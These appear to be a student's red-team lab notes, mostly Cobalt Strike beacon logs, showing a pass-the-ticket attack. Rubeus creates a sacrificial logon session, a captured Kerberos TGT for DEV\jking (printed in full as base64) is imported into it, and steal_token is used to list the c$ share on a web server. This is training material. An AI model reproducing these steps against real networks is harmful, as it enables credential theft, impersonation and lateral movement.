
use rubeus to create an empty  `sacrificial` logon session that we can pass a `TGT` into
`PID: 5092`
`LUID: 0x10ac500`
```powershell
[11/27 20:13:51] beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
[11/27 20:13:56] [*] Tasked beacon to run .NET program: Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
[11/27 20:13:56] [+] host called home, sent: 550752 bytes
[11/27 20:13:56] [+] received output:

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2 


[*] Action: Create Process (/netonly)


[*] Using random username and password.

[*] Showing process : False
[*] Username        : L4GGAFR3
[*] Domain          : PEH9QTQ9
[*] Password        : TS74Z7MJ
[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 5092
[+] LUID            : 0x10ac500

```
Import  `DEV\jking`'s `TGT` into the `luid` process that was created
```powershell
[11/27 20:15:37] beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /luid:0x10ac500 /ticket:doIFwjCCBb6gAwIBBaEDAgEWooIEuzCCBLdhggSzMIIEr6ADAgEFoRMbEURFVi5DWUJFUkJPVElDLklPoiYwJKADAgECoR0wGxsGa3JidGd0GxFERVYuQ1lCRVJCT1RJQy5JT6OCBGkwggRloAMCARKhAwIBAqKCBFcEggRTZ+TJ7jyPSjIj91WnX9TRuUsQJFsJge9d5FDpuzGb0UxAuYYvjykZIxnp9q2YitqOpTJBoa6NY2iPxzNW3UQP9R5brolgeUu4DEdAZcKqpmA5plHkyaPSMwAId+HFRIgN/YzNbO+rOJj6EQNrrec3LV8Z8hQ/kwf9rPjzqzbNmRi8IJ2EgkkD3ubiE9YChm8fgGOOgh8V6FxX3ddprjIf84hRbnodbjD4GHQtB4QY24Z7f5k9PFz/3JXJqdCnyP4iurGV4TKPN2fwqfETOu/NwCcxM2juysc+WdTO46pG3Z0TE5ovZiAEY0V1wymlRGi5PGhCALSaSh/mN2YewUxBsoV6cUx6rW0OPO5GfzoTIcm6oP+NJAkdN0yfqYYlYAWHtvQAnLt7ku1Z4x5ouV4g6oG9ll/ozp8SQTKNPPenaDYsTkj/5VA3temz4HwwU0DfDpUSfrhD+UL1Fis2GhbwXPI5B/2FSNYuNe2KtfxCVdDy47rOKgbt72me7rdU5JAGmgGhbAiyaRMnn2UlCsiLnhAYxYU91kGL/jegEVVq75DdOYLk6m7FBeOuPp/aFulAfC1rA31C0VSM7EwWZHxFywUguW6CXOFV7ILRdoARzHl1qM+T1YQdTOlbg6PoYugB25rw2TPenbI0kNCWLAWdP5AJHlllukbHtn9cYYiSNM7bf3CvwtPSSEG0J0FPjVPBgqNAoWKWJxEcD6WqV/Dn1HX3y3Awl8FpHzYClgLQFDj80aEwxnVIVkNPFifstd7FUeROhOfzhpynV3VMqoPogWE+jkGU65eh4ELfRoPrjdacfSHDigoqInQdTBnLuAI3VsNinrk/og6rtUCxM52En4Snd5+4IznQSAEB8w6pnOvE2AJTbrh9YH9Vc42zmFbMsuq3LNVKKz3+VVzMnCC6sPD5sGuhIS04FsCWYmKv0BABkAra0UyElyRuhbJ0lGTUDZ0L2aTeNvEynioxHs+gMJA+Lu7fPruAsxuS6pWAYRR+hseqggJAgnVOxYwLIEzxqp8WxJhMYllNMehCphKDohiKbq3dFufFYrIxKns7CsMa2bTeQ3tCpg0FMTVyi+BVQW2oFF2DUksKbc1SMwH2pe1+XJes1IIe1i4flTAqmS5KA5PdjlpHYJndjY6NKFhzl2jPs9bBpctofwxDDsaCQWKnpHe1rUDfVQPw35l/Rcn37q7Y1zp7FWW6MCADJugP3jRCmOr2v/anoqBARVhQ3QsMMaxBp8E6lv4oxTEf5EAOqdfTRLyM1ACSWKJzZAfnHdE/WBG4FNAi3Ot7I8bnPckaqdeDShrGxzVQMF+NlDhbKpp5ydMf/Ox5XUYfoloRgKaSRKNZVForQUfOcED9nbh2V9x6ItlXK79/8ab8Bn5/xc9Gpl2hxLVOeqE4VNiGzy+sHqtWgQbLVZWBw+2RxqA0KPsluro19AVAyvMXKTc99O9dknnwCby7H3mlYWsNRhVpo4HyMIHvoAMCAQCigecEgeR9geEwgd6ggdswgdgwgdWgKzApoAMCARKhIgQgi4nuXbdtVHwzbEEZ0B4WpPx/NuCuCU2xDrF37HUEnR6hExsRREVWLkNZQkVSQk9USUMuSU+iEjAQoAMCAQGhCTAHGwVqa2luZ6MHAwUAQOEAAKURGA8yMDIzMTEyNzE1MTIwNFqmERgPMjAyMzExMjgwMTEyMDRapxEYDzIwMjMxMjA0MTUxMjA0WqgTGxFERVYuQ1lCRVJCT1RJQy5JT6kmMCSgAwIBAqEdMBsbBmtyYnRndBsRREVWLkNZQkVSQk9USUMuSU8=
[11/27 20:15:42] [*] Tasked beacon to run .NET program: Rubeus.exe ptt /luid:0x10ac500 /ticket:doIFwjCCBb6gAwIBBaEDAgEWooIEuzCCBLdhggSzMIIEr6ADAgEFoRMbEURFVi5DWUJFUkJPVElDLklPoiYwJKADAgECoR0wGxsGa3JidGd0GxFERVYuQ1lCRVJCT1RJQy5JT6OCBGkwggRloAMCARKhAwIBAqKCBFcEggRTZ+TJ7jyPSjIj91WnX9TRuUsQJFsJge9d5FDpuzGb0UxAuYYvjykZIxnp9q2YitqOpTJBoa6NY2iPxzNW3UQP9R5brolgeUu4DEdAZcKqpmA5plHkyaPSMwAId+HFRIgN/YzNbO+rOJj6EQNrrec3LV8Z8hQ/kwf9rPjzqzbNmRi8IJ2EgkkD3ubiE9YChm8fgGOOgh8V6FxX3ddprjIf84hRbnodbjD4GHQtB4QY24Z7f5k9PFz/3JXJqdCnyP4iurGV4TKPN2fwqfETOu/NwCcxM2juysc+WdTO46pG3Z0TE5ovZiAEY0V1wymlRGi5PGhCALSaSh/mN2YewUxBsoV6cUx6rW0OPO5GfzoTIcm6oP+NJAkdN0yfqYYlYAWHtvQAnLt7ku1Z4x5ouV4g6oG9ll/ozp8SQTKNPPenaDYsTkj/5VA3temz4HwwU0DfDpUSfrhD+UL1Fis2GhbwXPI5B/2FSNYuNe2KtfxCVdDy47rOKgbt72me7rdU5JAGmgGhbAiyaRMnn2UlCsiLnhAYxYU91kGL/jegEVVq75DdOYLk6m7FBeOuPp/aFulAfC1rA31C0VSM7EwWZHxFywUguW6CXOFV7ILRdoARzHl1qM+T1YQdTOlbg6PoYugB25rw2TPenbI0kNCWLAWdP5AJHlllukbHtn9cYYiSNM7bf3CvwtPSSEG0J0FPjVPBgqNAoWKWJxEcD6WqV/Dn1HX3y3Awl8FpHzYClgLQFDj80aEwxnVIVkNPFifstd7FUeROhOfzhpynV3VMqoPogWE+jkGU65eh4ELfRoPrjdacfSHDigoqInQdTBnLuAI3VsNinrk/og6rtUCxM52En4Snd5+4IznQSAEB8w6pnOvE2AJTbrh9YH9Vc42zmFbMsuq3LNVKKz3+VVzMnCC6sPD5sGuhIS04FsCWYmKv0BABkAra0UyElyRuhbJ0lGTUDZ0L2aTeNvEynioxHs+gMJA+Lu7fPruAsxuS6pWAYRR+hseqggJAgnVOxYwLIEzxqp8WxJhMYllNMehCphKDohiKbq3dFufFYrIxKns7CsMa2bTeQ3tCpg0FMTVyi+BVQW2oFF2DUksKbc1SMwH2pe1+XJes1IIe1i4flTAqmS5KA5PdjlpHYJndjY6NKFhzl2jPs9bBpctofwxDDsaCQWKnpHe1rUDfVQPw35l/Rcn37q7Y1zp7FWW6MCADJugP3jRCmOr2v/anoqBARVhQ3QsMMaxBp8E6lv4oxTEf5EAOqdfTRLyM1ACSWKJzZAfnHdE/WBG4FNAi3Ot7I8bnPckaqdeDShrGxzVQMF+NlDhbKpp5ydMf/Ox5XUYfoloRgKaSRKNZVForQUfOcED9nbh2V9x6ItlXK79/8ab8Bn5/xc9Gpl2hxLVOeqE4VNiGzy+sHqtWgQbLVZWBw+2RxqA0KPsluro19AVAyvMXKTc99O9dknnwCby7H3mlYWsNRhVpo4HyMIHvoAMCAQCigecEgeR9geEwgd6ggdswgdgwgdWgKzApoAMCARKhIgQgi4nuXbdtVHwzbEEZ0B4WpPx/NuCuCU2xDrF37HUEnR6hExsRREVWLkNZQkVSQk9USUMuSU+iEjAQoAMCAQGhCTAHGwVqa2luZ6MHAwUAQOEAAKURGA8yMDIzMTEyNzE1MTIwNFqmERgPMjAyMzExMjgwMTEyMDRapxEYDzIwMjMxMjA0MTUxMjA0WqgTGxFERVYuQ1lCRVJCT1RJQy5JT6kmMCSgAwIBAqEdMBsbBmtyYnRndBsRREVWLkNZQkVSQk9USUMuSU8=
[11/27 20:15:42] [+] host called home, sent: 554652 bytes
[11/27 20:15:43] [+] received output:

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2 


[*] Action: Import Ticket
[*] Target LUID: 0x10ac500
[+] Ticket successfully imported!
```
![[Pasted image 20231127152333.png]]
`rubeus triage` to ensure that the `TGT` was properly imported into the `LUID`
```powershell
[11/27 20:16:37] beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
[11/27 20:16:42] [*] Tasked beacon to run .NET program: Rubeus.exe triage
[11/27 20:16:42] [+] host called home, sent: 550664 bytes
[11/27 20:16:43] [+] received output:

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2 


Action: Triage Kerberos Tickets (All Users)

[*] Current LUID    : 0x3e7

 -------------------------------------------------------------------------------------------------------------------- 
 | LUID      | UserName                     | Service                                       | EndTime               |
 -------------------------------------------------------------------------------------------------------------------- 
 | 0x10ac500 | jking @ DEV.CYBERBOTIC.IO    | krbtgt/DEV.CYBERBOTIC.IO                      | 11/28/2023 1:12:04 AM |
```
![[Pasted image 20231127152452.png]]
`steal token` of the process to utilize the `LUID` session as `DEV\jking` using the `TGT` found from [[3.2 credential_Theft]]
```powershell
[11/27 20:17:31] beacon> steal_token 5092
[11/27 20:17:31] [*] Tasked beacon to steal token from PID 5092
[11/27 20:17:31] [+] host called home, sent: 12 bytes
[11/27 20:17:31] [+] Impersonated NT AUTHORITY\SYSTEM
[11/27 20:18:22] beacon> ls \\web.dev.cyberbotic.io\c$
[11/27 20:18:22] [*] Tasked beacon to list files in \\web.dev.cyberbotic.io\c$
[11/27 20:18:22] [+] host called home, sent: 44 bytes
[11/27 20:18:22] [*] Listing: \\web.dev.cyberbotic.io\c$\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     08/15/2022 18:50:13   $Recycle.Bin
          dir     08/10/2022 04:55:17   $WinREAgent
          dir     08/10/2022 05:05:53   Boot
          dir     08/18/2021 23:34:55   Documents and Settings
          dir     08/19/2021 06:24:49   EFI
          dir     08/15/2022 18:58:09   inetpub
          dir     05/08/2021 08:20:24   PerfLogs
          dir     09/26/2023 08:38:47   Program Files
          dir     08/10/2022 04:06:16   Program Files (x86)
          dir     11/02/2023 20:05:43   ProgramData
          dir     08/15/2022 18:31:08   Recovery
          dir     11/02/2022 09:32:00   System Volume Information
          dir     08/30/2022 17:51:08   Users
          dir     09/26/2023 08:51:14   Windows
 427kb    fil     08/10/2022 05:00:07   bootmgr
 1b       fil     05/08/2021 08:14:33   BOOTNXT
```
and now we have access to the `\\web.cyberbotic.io\c$`
![[Pasted image 20231127152640.png]]
how to kill the process once it is completed
![[Pasted image 20231127152737.png]]